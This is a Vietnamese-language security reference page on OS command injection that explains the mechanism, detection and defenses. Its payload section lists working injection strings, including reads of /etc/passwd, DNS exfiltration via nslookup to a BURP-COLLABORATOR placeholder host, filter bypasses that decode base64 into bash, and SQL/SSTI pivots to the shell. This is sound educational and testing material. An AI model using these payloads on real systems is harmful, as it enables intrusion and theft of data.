# OS Command Injection

> Đầu vào không đáng tin tới được một shell, cho phép kẻ tấn công chạy các lệnh hệ thống. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/os_comand.md`](../../../../Troubleshooting_Guide/os_comand.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** Command Injection · A03:2021 Injection
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
OS command injection xảy ra khi một ứng dụng đưa đầu vào do kẻ tấn công kiểm soát vào một shell hệ
thống, cho phép kẻ tấn công chạy các lệnh tùy ý trên máy chủ. Nó thường phát sinh ở bất cứ đâu ứng
dụng gọi ra một tiện ích (ping, ImageMagick, một script sao lưu) và xây dựng dòng lệnh từ đầu vào
người dùng.

## Cơ chế hoạt động (How it works)
Ứng dụng dựng một chuỗi lệnh và trao nó cho một shell (`system()`, `exec()`, `Runtime.exec` với một
shell, `child_process.exec`, dấu backtick). Vì shell diễn giải các ký tự đặc biệt — `;`, `|`, `&&`,
`||`, `` ` ``, `$()`, ký tự xuống dòng — đầu vào chứa chúng không còn chỉ là một đối số nữa: nó kết
thúc lệnh dự định hoặc nối thêm một lệnh mới. Kẻ tấn công kiểm soát một phần dòng lệnh; ứng dụng thất
bại vì nối dữ liệu không đáng tin vào một chuỗi mà shell phân tích; việc thực thi thoát ra khỏi lệnh
đơn dự định.

## Tác động (Impact)
Thực thi lệnh tùy ý với tư cách tài khoản web/dịch vụ, thường dẫn tới xâm nhập toàn bộ máy chủ: đọc
và rò rỉ file, gài webshell, di chuyển ngang, và dùng máy chủ làm điểm trung chuyển. Đây là một trong
những lỗ hổng web nghiêm trọng nhất — gần như luôn ở mức nghiêm trọng.

## Cách phát hiện (How to detect)
- Nối thêm một dấu phân cách cộng với một lệnh vô hại (ví dụ `1|whoami`, `1$(whoami)`) trả về kết
  quả đầu ra của lệnh trong phản hồi.
- Trường hợp mù: một payload `sleep`/`ping`/`timeout` tạo ra độ trễ đo lường được, tỷ lệ thuận, hoặc
  một callback DNS/HTTP tới được một host collaborator do bạn kiểm soát.
- Thông báo lỗi hoặc stack trace tiết lộ việc gọi shell, hoặc kết quả đầu ra bất ngờ khi các ký tự
  đặc biệt được gửi vào.

## Khai thác (tóm tắt) (Exploitation)
Chọn một dấu phân cách mà shell mục tiêu tôn trọng và nối thêm một lệnh — bắt đầu bằng một phép thử
vô hại (`whoami`, `id`). Khi kết quả được phản chiếu, đọc nó trực tiếp; khi mù, xác nhận việc thực
thi qua độ trễ thời gian hoặc DNS out-of-band, rồi rò rỉ bằng cách mã hóa kết quả lệnh vào các
subdomain hoặc ghi vào một đường dẫn web truy cập được. Các bộ lọc bị vượt qua bằng các vật thay thế
khoảng trắng (`$IFS`), globbing, làm rối từ khóa, và giải mã lúc chạy. Payload đầy đủ nằm trong phần
Payload và tài liệu chuyên sâu.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Dấu phân cách lệnh theo nền tảng (Command separators by platform)
Chọn một dấu phân cách mà shell mục tiêu tôn trọng; nối thêm một lệnh vô hại (`whoami`) vào một giá trị tham số hợp lệ.

| Dấu phân cách | Linux/Unix | Windows |
|-----------|:---:|:---:|
| `\|` (pipe) | `1\|whoami` | `1\|whoami` |
| `;` | `1;whoami` | — |
| `&` | — | `1&whoami` |
| `&&` | `1&&whoami` | `1&&whoami` |
| `\|\|` | `1\|\|whoami` | `1\|\|whoami` |
| backtick | ``1`whoami` `` | — |
| `$()` | `1$(whoami)` | — |
| newline `%0a` | `1%0awhoami` | `1%0awhoami` |

### Tiêm đơn giản (kết quả được phản chiếu) (Simple injection (output reflected))
Khi kết quả lệnh được phản hồi lại trong response.

```bash
1|whoami
1;whoami
1&&whoami
1||whoami
1`whoami`
1$(whoami)
```

### Mù — phát hiện bằng độ trễ thời gian (Blind — time-delay detection)
Không có kết quả trả về; xác nhận việc thực thi bằng cách đo độ trễ phản hồi.

```bash
# Linux
x||sleep 10||
x;sleep 10;
x`sleep 10`

# Windows
x||timeout 10||
x&ping -n 10 127.0.0.1&
```

### Mù — chuyển hướng kết quả (Blind — output redirection)
Ghi kết quả lệnh vào một đường dẫn web truy cập được, rồi tải nó về.

```bash
||whoami>/var/www/images/output.txt||
||id>/var/www/images/out.txt||
x;cat /etc/passwd>/var/www/images/passwd.txt;
||ls -la />/var/www/images/listing.txt||
# retrieve: GET /image?filename=output.txt
```

### Mù — phát hiện & rò rỉ out-of-band (DNS) (Blind — out-of-band (DNS) detection & exfiltration)
Kích hoạt một truy vấn DNS tới một host collaborator do bạn kiểm soát; nhúng kết quả lệnh vào subdomain để rò rỉ.

```bash
# detection
x||nslookup BURP-COLLABORATOR||
||dig BURP-COLLABORATOR||
||host BURP-COLLABORATOR||
x`nslookup BURP-COLLABORATOR`

# data exfiltration
||nslookup $(whoami).BURP-COLLABORATOR||
||nslookup $(hostname).BURP-COLLABORATOR||
||nslookup $(pwd|tr '/' '-').BURP-COLLABORATOR||
||nslookup $(cat /etc/passwd | base64 | tr -d '\n').BURP-COLLABORATOR||
```

### Vượt bộ lọc — khoảng trắng (Filter bypass — whitespace)
Khi khoảng trắng bị loại bỏ hoặc chặn.

```bash
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
{cat,/etc/passwd}
```

### Vượt bộ lọc — dấu gạch chéo / globbing đường dẫn (Filter bypass — slash / path globbing)
Khi `/` hoặc đường dẫn đầy đủ bị lọc, dùng ký tự đại diện hoặc cách gián tiếp.

```bash
cat /et?/passw?
cat /etc/pass*
cat $(echo /etc/passwd)
```

### Vượt bộ lọc — làm rối từ khóa (Filter bypass — keyword obfuscation)
Khi một tên lệnh (ví dụ `cat`) bị đưa vào blacklist, tách nó ra bằng dấu nháy, ký tự thoát, hoặc đường dẫn tuyệt đối.

```bash
c\at /etc/passwd
c'a't /etc/passwd
c"a"t /etc/passwd
$(printf 'cat') /etc/passwd
ca''t /etc/passwd
\c\a\t /etc/passwd
/bin/cat /etc/passwd
/usr/bin/cat /etc/passwd
```

### Vượt bộ lọc — mã hóa (Filter bypass — encoding)
Lén đưa lệnh qua bộ lọc bằng cách giải mã lúc chạy.

```bash
# base64 -> cat /etc/passwd
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# hex -> cat /etc/passwd
echo "63617420 2f6574632f706173737764" | xxd -r -p | bash

# URL-encoded "cat /etc/passwd"
%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64
```

### Vượt bộ lọc — thoát dấu nháy/ngữ cảnh (Filter bypass — quote/context escape)
Thoát ra khỏi một chuỗi được bao trong dấu nháy trước khi tiêm.

```bash
';whoami;'
";whoami;"
username';whoami;'
email";id;"
```

### Tới được shell qua các lớp injection khác (Reaching the shell via other injection classes)
Trung chuyển từ template hoặc SQL injection sang thực thi lệnh OS.

```python
# Jinja2 SSTI -> shell
{{''.__class__.__mro__[1].__subclasses__()[414]('whoami',shell=True,stdout=-1).communicate()}}
```

```sql
-- MySQL
SELECT sys_exec('whoami');
SELECT load_file('/etc/passwd');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'whoami';

-- MSSQL
EXEC xp_cmdshell 'whoami';
```

## Phòng chống (Defenses)
1. **Tránh hoàn toàn shell** — gọi binary mục tiêu qua một API mảng-đối số
   (`execve`, `subprocess.run([...], shell=False)`, `ProcessBuilder`) để đầu vào được truyền như các
   đối số rời rạc, không bao giờ bị phân tích để tìm ký tự đặc biệt (bản vá chính).
2. **Ưu tiên các hàm của ngôn ngữ/thư viện native** thay vì gọi ra shell khi có sẵn một hàm như vậy.
3. Nếu không thể tránh shell, **lập danh sách cho phép (allow-list)** đúng các giá trị được phép và
   xác thực đầu vào nghiêm ngặt theo một mẫu chặt chẽ; không dựa vào việc blacklist các ký tự đặc biệt.
4. Chạy tiến trình với **đặc quyền tối thiểu** và trong sandbox/container để giới hạn phạm vi ảnh hưởng.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=OS+Command+Injection
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=OS+Command+Injection
- **Exploit-DB** — https://www.exploit-db.com/search?q=OS+Command+Injection
- **GitHub Advisories** — https://github.com/advisories?query=OS+Command+Injection
- **OSV** — https://osv.dev/list?q=OS+Command+Injection
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `OS Command Injection <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi dựa vào chi tiết._
- `CVE-2014-6271` — "Shellshock," command injection qua các biến môi trường được tạo thủ công và
  phân tích bởi Bash; bị khai thác hàng loạt nhắm vào các endpoint CGI.
- `CVE-2021-44228` — "Log4Shell," tra cứu JNDI dẫn tới thực thi mã từ xa (một RCE thuộc lớp injection
  thường được nối chuỗi với thực thi lệnh).
- `CVE-2017-9841` — Thực thi lệnh từ xa qua `eval-stdin.php` của PHPUnit, bị quét và khai thác rộng rãi.

## Tham khảo (References)
- PortSwigger Web Security Academy — OS command injection.
- OWASP — OS Command Injection Defense Cheat Sheet.
- OWASP — Command Injection (tham chiếu WSTG / Attacks).
